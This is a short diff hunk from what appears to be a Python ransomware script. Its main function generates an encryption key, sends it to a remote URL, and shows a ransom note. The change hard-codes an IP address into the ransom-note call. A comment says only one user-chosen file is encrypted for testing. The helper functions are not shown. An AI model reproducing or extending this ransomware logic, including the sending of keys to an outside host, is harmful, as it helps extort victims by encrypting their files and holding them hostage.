@@ -120,7 +120,7 @@ def main():
     
     key = createKey()
     sendKey(key, url)
-    ransomNote(url)
+    ransomNote("3.89.155.77")
     #Encrypt only 1 file for testing purposes.
     #Ask the user for the file to encrypt.
     file = input("Enter the file to encrypt: ")
